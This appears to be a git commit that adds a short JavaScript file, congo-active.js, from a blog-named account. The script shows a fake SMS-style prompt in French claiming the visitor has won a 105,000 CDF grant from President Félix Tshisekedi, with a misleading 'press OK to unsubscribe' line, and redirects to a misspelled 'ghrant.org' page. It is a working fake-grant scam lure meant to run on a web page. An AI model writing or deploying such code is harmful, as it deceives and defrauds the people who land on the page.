79761c5b17417cd98bb831bdcf6108bc8b2493b9
mfednewblog8 <nsikakimoh68@gmail.com>
2025-11-17 06:39:44 +0100

    Create congo-active.js

---
+++ congo-active.js
@@ -0,0 +1,5 @@
+var password = 'RETRAIT DE 105 000 CDF'
+password=prompt('SMS: Félicitations, vous faites partie des personnes sélectionnées pour recevoir une subvention de 105 000 CDF du président Felix Tshisekedi. Appuyez sur OK pour vous désinscrire. ','RETRAIT DE 105 000 CDF');
+if (password != 'RETRAIT DE 105 000 CDF') {
+location.href='https://ghrant.org/congo-grant.html';
+}
